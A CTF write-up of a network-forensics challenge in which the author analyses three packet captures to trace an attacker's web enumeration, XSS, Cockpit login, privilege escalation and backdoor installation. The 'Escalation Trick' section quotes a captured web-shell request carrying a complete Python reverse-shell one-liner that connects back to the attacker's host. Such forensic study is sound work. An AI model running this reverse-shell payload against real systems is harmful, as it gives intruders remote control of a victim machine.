# Attack Investigation - Networks

## Challenge

This was a multi-part challenge which unlocked further stages as you completed them. For the sake of brevity I am recording them on a singular document under a singular title instead of creating unique ones for each challenge.

## Solve:

### Server & Attacker IP

Filtering for `http` traffic we can see evidence of web directory enumeration from `192.168.1.9` to `192.168.1.10`:

nw1

`KCTF{192.168.1.10_192.168.1.9} `

### The Real Admin 

Filtering for `http` traffic which doesn't include the attackers IP, we can see admin activity from `192.168.1.3`:

nw2

`KCTF{192.168.1.3}`


### The Intruder's Identity

Filtering for POST requests from the attacker's IP, can find credentials used to register an account:

nw3

`KCTF{theexploiter_exploiter@test}`

### Compromising the Admin

Same filters, can view multiple attempts to login to `admin` and find compromised credentials after final attempt:

nw4

`KCTF{theexploiter_exploiter@test}`

### Initial Reconnaisance

To explore the tools that may have been used, my teammate (`Ch1maera`) used `tshark` to enumerate `User-Agents`, and found:

`93e4r0-CVE-2014-6271`

Doing a search for "93e4r0-CVE-2014-6271" led to the GitHub repo for `nikto`, a web enumeration tool.

The `User-Agent` can be found with this command:

```
./tshark.exe -r capture1.pcapng -Y "http.user_agent" -T fields -e http.user_agent | Sort-Object | Get-Unique
```

nw5

`KCTF{nikto}`

### Stealing the Sweet

Found evidence of and XSS attack under Statistics->HTTP->Requests:

nw6

Filtering for `http` traffic that is not destined for port 80 (credit to my teammate `sealldev`) we can see HTTP packets sent from the server to the attackers IP:

nw7

`KCTF{8881_xss}`

### The Overseer

Moving on to the second packet capture, the first batch of packets show requests to `/cockpit`:

nw8

`KCTF{cockpit}`

### The Gatekeeper

To find out the port the server listens on, just check the GET request to `/cockpit/login` above.

`KCTF{9090}`

### The Server's Identity 

Viewing the WebSocket traffic we can see the `host` in the attackers communication with the server is specified as `localhost`:

nw9

KCTF`{localhost.localdomain}`

### Tareq's Secret 

To find the password, filter for `http` requests to `/cockpit/login` and view last (and successful) login attempt:

nw10

`KCTF{SecurePass}`

### The Escalation Trick

Moving on to the third and final packet capture, we can filter for `http` requests and sort by length to view commands requested as URIs:

nw11

```
 GET /uploads/678e2443a6725.php?cmd=export%20RHOST=%22192.168.1.9%22;export%20RPORT=5074;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27 HTTP/1.1
```

The command appears to be establishing a reverse shell. Following the tcp stream (credit to `sealldev`) shows attacker executing commands through this shell and reveals the tool used to escalate privileges:

nw12

`KCTF{awk}`

### The Hidden Door

In the same TCP stream, we can view the commands executed by the attacker to establish a backdoor:

nw13

The attacker changes to the `root` directory, creates a hidden directory `.sys` and installs the backdoor via `wget` on port 2081.

`KCTF{/root/.sys/sys_2081}`

### Port Fiesta

In the same TCP stream, we can see the server is started on 10 different ports:

nw14

`KCTF{10}`

### The Backdoor's Whisper

Manually checking the ports from the previous question with `tcp.port == <port>`, only port 12345 has any activity:

`KCTF{12345}`

### The Unused Tool 

In the same TCP stream where we can view the attackers commands, we can see they attempted to install and run `tmux` but was unsuccessful:

nw15

nw16

`KCTF{tmux}`

### Malicious Uploads 

This challenge goes back to the first packet capture and asks for the name of the maliciously uploaded file. Since            `/blog/create` has been exploited before, can check for POST requests and find `serverfile.php`:

nw17

`KCTF{serverfile.php}`

### Shell History

Apparently a malicious shell file already existed on the system. The flag asks for the date and time, suggesting an `ls` may have been used with the `l` flag showing the date/time as well as the file name (credit to `sealldev`). Going back to the attackers commands and checking for an `ls -l` proves this theory correct:

nw18

`KCTF{php-reverse-shell.php_Jan_19}`